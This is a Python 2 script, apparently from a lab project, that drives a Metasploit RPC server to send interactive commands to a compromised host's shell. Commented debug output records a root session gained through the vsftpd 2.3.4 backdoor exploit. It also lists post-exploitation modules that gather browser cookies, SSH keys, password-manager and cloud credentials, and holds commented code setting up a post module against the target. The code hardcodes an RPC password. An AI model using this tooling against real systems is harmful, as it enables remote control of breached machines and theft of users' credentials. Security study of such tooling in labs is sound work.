import time
from metasploit.msfrpc import MsfRpcClient
# from channels import Group
import datetime
import json
import os,sys
import time
import subprocess

def session_interaction_handler(session_id,cmd):

    print("*****************************backend session check  process")
    try:
        client = MsfRpcClient("123",server="127.0.0.1",ssl=False)
        print ("********************** rpc connected ")
    except Exception as e:
          print  e 
            # Group('pool').send({
            #     "text": json.dumps({
            #         "action":"session_interact_"+session_id, 
            #         "session_interact_response": "\n Metasploit connection Error, ",
            #     })
            # })
    else:
        if bool(client.sessions.list):

            print (type(client.sessions.list))
            print (client.sessions.list.keys())
            print(bool(client.sessions.list))
            session_id = int(session_id)
            # session_id = 5 - 1
            # session_idd = client.sessions.list.keys()
            shell = client.sessions.session(session_id)
            print shell
            print("\n\n")
            cond = True
            try:
                while cond == True :
                    inn = raw_input("shell_by_CH >  ")
                    if inn == "exit":
                        exit()
                    shell.write(inn+'\n')
                    print shell.read()
                    
            except Exception as e:
                    client = MsfRpcClient("123",server="127.0.0.1",ssl=False)
                    print e
            finally:
                while cond == True :
                    inn = raw_input("shell_by_CH >  ")
                    if inn == "exit":
                        exit()
                    shell.write(inn+'\n')
                    print shell.read()


# session_interaction_handler("5","ls")




# *********************** following is debuging if need any explanation cosult one of then 


# print client.sessions
# print dir(client.sessions) #'list', 'rpc', 'session']


# print session_idd
# print("************* job list")
# print client.jobs.list
# print("************* sesion list ")
# print client.sessions.list

# if client:
#     print (type(client.sessions.list))
#     print ("Total sessions ")
#     print (client.sessions.list.keys())
#     print(bool(client.sessions.list))
#     session_idd = client.sessions.list.keys()
#     # print session_idd
#     # shell = client.sessions.session(session_idd[0])

# for k,v in client.sessions.list.items():
#     print "Metasploit Rpc Session key => : "
#     print k
#     print "Session Type => : "+v['type']
#     print v



# {1: {'info': '', 'username': 'root', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact', 'uuid': 'fao3sjc7', 'tunnel_local': '0.0.0.0:0', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor', 'arch': 'cmd', 'exploit_uuid': 'mjftohjh', 'tunnel_peer': '172.16.217.128:6200', 'workspace': 'false', 'routes': '', 'target_host': '172.16.217.128', 'type': 'shell', 'session_host': '172.16.217.128', 'desc': 'Command shell'}}


# session_idd = client.sessions.list.keys()#[1]
# print session_idd
# shell = client.sessions.session(session_idd[0])
# print dir(shell)
# 'id', 'modules', 'read', 'ring', 'rpc', 'stop', 'upgrade', 'write']


# print shell.id #1
# print dir(shell.ring)
# # 'id', 'last', 'put', 'read', 'rpc']
# print
# print shell.modules
# [
'''
'post/multi/escalate/aws_create_iam_user', 
'post/multi/escalate/metasploit_pcaplog', 
'post/multi/gather/aws_ec2_instance_metadata', 
'post/multi/gather/chrome_cookies', 
'post/multi/gather/docker_creds', 
'post/multi/gather/enum_vbox', 
'post/multi/gather/fetchmailrc_creds', 
'post/multi/gather/filezilla_client_cred', 
'post/multi/gather/find_vmx', 
'post/multi/gather/firefox_creds', 
'post/multi/gather/gpg_creds', 
'post/multi/gather/grub_creds', 
'post/multi/gather/irssi_creds', 
'post/multi/gather/lastpass_creds', 
'post/multi/gather/maven_creds', 
'post/multi/gather/netrc_creds', 
'post/multi/gather/pgpass_creds',
'post/multi/gather/pidgin_cred', 
'post/multi/gather/remmina_creds', 
'post/multi/gather/rubygems_api_key', 
'post/multi/gather/ssh_creds', 
'post/multi/general/close', 
'post/multi/general/execute', 
'post/multi/general/wall', 
'post/multi/manage/multi_post', 
'post/multi/manage/play_youtube', 
'post/multi/manage/shell_to_meterpreter', 
'post/multi/manage/sudo', 
'post/multi/manage/system_session', 
'post/multi/manage/upload_exec', 
'post/multi/recon/local_exploit_suggester', 
'post/multi/recon/sudo_commands', 
'post/osx/gather/apfs_encrypted_volume_passwd']




'''
# print (help(shell.modules))
# print shell.modules("exploit","post/multi/escalate/aws_create_iam_user")
     # 'id', 'modules', 'read', 'ring', 'rpc', 'stop', 'upgrade', 'write']


# print "*******************************************post"
# post_exploit = client.modules.use('post', 'post/multi/escalate/metasploit_pcaplog')
# print dir(post_exploit)
# print
# print post_exploit.rank
 
'''
 'actions', 
'advanced', 
'arch', 
'authors', 
'description', 
'disclosuredate',
 'evasion', 
 'execute',
  'filepath', 
  'fullname', 
  'license',
   'modulename',
    'moduletype', 
    'name', 
    'optioninfo', 
    'options', 
    'platform',
     'privileged',
      'rank', 
      'references', 
      'required', 
      'rpc', 
      'runoptions', 
      'sessions', 
      'type', 
      'update'

      '''
# print post_exploit.type
# print "sesison"
# print post_exploit['SESSION']
'''
 ['DOMAIN', 
 'IAM_GROUP_POL',
 'SESSION', 
 'CREATE_CONSOLE', 
 'RHOST', 
 'SSLVersion', 
 'RHOSTS', 
 'Region', 
 'CREATE_API', 
 'METADATA_IP', 
 'SSL', 
 'RPORT
 ']


'''
# post_exploit['SESSION'] = shell
# post_exploit['RPORT'] = "6200"
# post_exploit['RHOSTS'] = "172.16.217.128"
# 172.16.217.128:6200
# print post_exploit.SESSION()

# if bool(client.sessions.list):

#     print (type(client.sessions.list))
#     print (client.sessions.list.keys())
#     print(bool(client.sessions.list))
#     session_id = 5 - 1
#     session_idd = client.sessions.list.keys()
#     shell = client.sessions.session(5)
#     print shell
#     print("\n\n")
#     cond = True
#     try:
#         while cond == True :
#             inn = raw_input("shell_by_CH >  ")
#             if inn == "exit":
#                 exit()
#             shell.write(inn+'\n')
#             print shell.read()
            
#     except Exception as e:
#             client = MsfRpcClient("123",server="127.0.0.1",ssl=False)
#             print e
#     finally:
#         while cond == True :
#             inn = raw_input("shell_by_CH >  ")
#             if inn == "exit":
#                 exit()
#             shell.write(inn+'\n')
#             print shell.read()
